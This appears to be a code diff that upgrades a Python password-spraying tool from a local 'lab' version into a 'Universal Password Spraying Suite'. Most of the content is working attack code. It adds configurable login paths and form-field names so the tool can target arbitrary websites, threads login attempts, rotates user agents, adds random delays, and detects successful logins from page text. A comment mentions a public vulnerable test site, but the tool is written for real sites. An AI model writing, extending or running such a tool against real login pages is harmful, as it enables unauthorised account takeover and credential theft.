@@ -48,7 +48,7 @@ def show_banner():
 ██║╚██╗██║██╔══╝   ██╔██╗ ██║   ██║╚════██║
 ██║ ╚████║███████╗██╔╝ ██╗╚██████╔╝███████║
 ╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝
-{Colors.PURPLE}High-Efficiency Password Spraying Lab v6.0{Colors.END}
+{Colors.PURPLE}Universal Password Spraying Suite v7.0{Colors.END}
 {Colors.DIM}--------------------------------------------------{Colors.END}
     """
     print(banner)
@@ -59,7 +59,7 @@ def main_menu():
     print(f"{Colors.YELLOW}[ Main Menu ]{Colors.END}")
     print(f"{Colors.GREEN}[1]{Colors.END} Run Security Scan")
     print(f"{Colors.GREEN}[2]{Colors.END} Target Configuration")
-    print(f"{Colors.GREEN}[3]{Colors.END} Server Settings")
+    print(f"{Colors.GREEN}[3]{Colors.END} Server & Field Settings")
     print(f"{Colors.GREEN}[4]{Colors.END} Advanced Settings")
     print(f"{Colors.RED}[0]{Colors.END} Exit")
     
@@ -67,7 +67,7 @@ def main_menu():
     return choice
 
 def spray_task(target, password, url, config, results):
-    headers = {'Content-Type': 'application/json'}
+    headers = {}
     if config['advanced_settings']['random_user_agents']:
         headers['User-Agent'] = random.choice(USER_AGENTS)
     
@@ -76,19 +76,27 @@ def spray_task(target, password, url, config, results):
         delay = random.uniform(config['advanced_settings']['smart_delay'][0], config['advanced_settings']['smart_delay'][1])
         time.sleep(delay)
         
-        # REAL HTTP REQUEST
-        payload = {"username": target, "password": password}
-        response = requests.post(f"{url}/login", json=payload, headers=headers, timeout=config['server_settings']['timeout'])
+        # Build Dynamic Payload
+        user_field = config['server_settings'].get('user_field', 'username')
+        pass_field = config['server_settings'].get('pass_field', 'password')
+        path = config['server_settings'].get('login_path', '/login')
         
-        if response.status_code == 200:
+        payload = {user_field: target, pass_field: password}
+        full_url = url.rstrip('/') + path
+        
+        # Support both JSON and Form Data (Form data is common in real sites)
+        response = requests.post(full_url, data=payload, headers=headers, timeout=config['server_settings']['timeout'])
+        
+        # Detection logic (can be customized)
+        # For testphp.vulnweb.com, it redirects on success or shows specific text
+        if response.status_code == 200 and ("logout" in response.text.lower() or "success" in response.text.lower()):
             msg = f"\n{Colors.GREEN}{Colors.BOLD}[SUCCESS] Found: {target} -> {password}{Colors.END}"
             print(msg)
             results.append({"target": target, "password": password, "time": datetime.now().strftime("%H:%M:%S")})
             return True
-        else:
-            if config['scan_settings']['verbose']:
-                sys.stdout.write(f"{Colors.DIM}[-] Tried {target}:{password} | Status: {response.status_code}{Colors.END}\n")
-                sys.stdout.flush()
+        elif config['scan_settings']['verbose']:
+            sys.stdout.write(f"{Colors.DIM}[-] Tried {target}:{password} | Status: {response.status_code}{Colors.END}\n")
+            sys.stdout.flush()
     except Exception as e:
         if config['scan_settings']['verbose']:
             print(f"\n{Colors.RED}[!] Error on {target}: {str(e)[:50]}{Colors.END}")
@@ -109,18 +117,17 @@ def run_high_efficiency_scan():
         time.sleep(2)
         return
 
-    print(f"{Colors.YELLOW}Target URL: {Colors.CYAN}{url}{Colors.END}")
-    print(f"{Colors.YELLOW}Threads: {Colors.CYAN}{threads}{Colors.END} | Targets: {Colors.CYAN}{len(targets)}{Colors.END}")
-    print(f"{Colors.YELLOW}Initiating REAL Spray Attack...{Colors.END}\n")
+    print(f"{Colors.YELLOW}Target URL: {Colors.CYAN}{url}{config['server_settings'].get('login_path', '')}{Colors.END}")
+    print(f"{Colors.YELLOW}Fields: {Colors.CYAN}{config['server_settings'].get('user_field')} / {config['server_settings'].get('pass_field')}{Colors.END}")
+    print(f"{Colors.YELLOW}Initiating Universal Spray...{Colors.END}\n")
 
     found_results = []
     
     with ThreadPoolExecutor(max_workers=threads) as executor:
         for pwd in passwords:
-            print(f"{Colors.BLUE}{Colors.BOLD}[*] Spraying all targets with password: {pwd}{Colors.END}")
+            print(f"{Colors.BLUE}{Colors.BOLD}[*] Spraying password: {pwd}{Colors.END}")
             futures = [executor.submit(spray_task, target, pwd, url, config, found_results) for target in targets]
             for f in futures: f.result()
-            print(f"{Colors.DIM}--- Finished spraying password: {pwd} ---{Colors.END}\n")
     
     print(f"\n{Colors.YELLOW}=== Scan Summary ==={Colors.END}")
     print(f"Total Found: {Colors.GREEN}{len(found_results)}{Colors.END}")
@@ -135,27 +142,20 @@ def target_config():
         clear_screen()
         show_banner()
         print(f"{Colors.YELLOW}[ Target Configuration ]{Colors.END}")
-        print(f"{Colors.GREEN}[1]{Colors.END} Manage Emails")
-        print(f"{Colors.GREEN}[2]{Colors.END} Manage Phone Numbers")
-        print(f"{Colors.GREEN}[3]{Colors.END} Manage Passwords")
+        print(f"{Colors.GREEN}[1]{Colors.END} Manage Emails/Usernames")
+        print(f"{Colors.GREEN}[2]{Colors.END} Manage Passwords")
         print(f"{Colors.RED}[0]{Colors.END} Back")
         
         choice = input(f"\n{Colors.BOLD}{Colors.CYAN}Nexus/Targets > {Colors.END}")
         if choice == '1':
-            print(f"\nCurrent Emails: {config['targets']['emails']}")
-            new = input("Add new email (or 'clear' to reset): ")
+            print(f"\nCurrent List: {config['targets']['emails']}")
+            new = input("Add new (or 'clear'): ")
             if new == 'clear': config['targets']['emails'] = []
             elif new: config['targets']['emails'].append(new)
             save_config(config)
         elif choice == '2':
-            print(f"\nCurrent Phones: {config['targets']['phones']}")
-            new = input("Add new phone (or 'clear' to reset): ")
-            if new == 'clear': config['targets']['phones'] = []
-            elif new: config['targets']['phones'].append(new)
-            save_config(config)
-        elif choice == '3':
             print(f"\nCurrent Passwords: {config['passwords_to_test']}")
-            new = input("Add new password (or 'clear' to reset): ")
+            new = input("Add new (or 'clear'): ")
             if new == 'clear': config['passwords_to_test'] = []
             elif new: config['passwords_to_test'].append(new)
             save_config(config)
@@ -167,26 +167,29 @@ def server_config():
         config = load_config()
         clear_screen()
         show_banner()
-        print(f"{Colors.YELLOW}[ Server Configuration ]{Colors.END}")
-        print(f"Current Target: {Colors.CYAN}{config['server_settings']['local_url'] if config['server_settings']['mode'] == 'local' else config['server_settings']['custom_url']}{Colors.END}")
-        print(f"Current Mode: {Colors.PURPLE}{config['server_settings']['mode'].upper()}{Colors.END}\n")
-        print(f"{Colors.GREEN}[1]{Colors.END} Switch to LOCAL Server")
-        print(f"{Colors.GREEN}[2]{Colors.END} Set CUSTOM Server URL")
-        print(f"{Colors.RED}[0]{Colors.END} Back")
+        print(f"{Colors.YELLOW}[ Server & Field Settings ]{Colors.END}")
+        print(f"1. URL: {Colors.CYAN}{config['server_settings']['custom_url'] if config['server_settings']['mode'] == 'custom' else config['server_settings']['local_url']}{Colors.END}")
+        print(f"2. Path: {Colors.CYAN}{config['server_settings'].get('login_path')}{Colors.END}")
+        print(f"3. User Field: {Colors.CYAN}{config['server_settings'].get('user_field')}{Colors.END}")
+        print(f"4. Pass Field: {Colors.CYAN}{config['server_settings'].get('pass_field')}{Colors.END}")
+        print(f"5. Switch Mode (Current: {config['server_settings']['mode'].upper()})")
+        print(f"0. Back")
         
         choice = input(f"\n{Colors.BOLD}{Colors.CYAN}Nexus/Server > {Colors.END}")
         if choice == '1':
-            config['server_settings']['mode'] = "local"
-            save_config(config)
+            config['server_settings']['custom_url'] = input("Enter Base URL (e.g. http://site.com): ")
+            config['server_settings']['mode'] = "custom"
         elif choice == '2':
-            new_url = input("Enter custom URL (e.g. http://192.168.1.10:5000): ")
-            if new_url:
-                if not new_url.startswith("http"): new_url = "http://" + new_url
-                config['server_settings']['custom_url'] = new_url
-                config['server_settings']['mode'] = "custom"
-                save_config(config)
+            config['server_settings']['login_path'] = input("Enter Login Path (e.g. /login.php): ")
+        elif choice == '3':
+            config['server_settings']['user_field'] = input("Enter User Field Name: ")
+        elif choice == '4':
+            config['server_settings']['pass_field'] = input("Enter Pass Field Name: ")
+        elif choice == '5':
+            config['server_settings']['mode'] = "local" if config['server_settings']['mode'] == "custom" else "custom"
         elif choice == '0':
             break
+        save_config(config)
 
 def advanced_config():
     while True:
@@ -196,13 +199,11 @@ def advanced_config():
         print(f"{Colors.YELLOW}[ Advanced Settings ]{Colors.END}")
         print(f"1. Threads: {Colors.CYAN}{config['advanced_settings']['threads']}{Colors.END}")
         print(f"2. Random User-Agents: {Colors.CYAN}{config['advanced_settings']['random_user_agents']}{Colors.END}")
-        print(f"3. Smart Delay: {Colors.CYAN}{config['advanced_settings']['smart_delay']}{Colors.END}")
         print(f"0. Back")
         
         choice = input(f"\n{Colors.BOLD}{Colors.CYAN}Nexus/Advanced > {Colors.END}")
         if choice == '1':
-            try:
-                config['advanced_settings']['threads'] = int(input("Enter number of threads: "))
+            try: config['advanced_settings']['threads'] = int(input("Threads: "))
             except: pass
         elif choice == '2':
             config['advanced_settings']['random_user_agents'] = not config['advanced_settings']['random_user_agents']
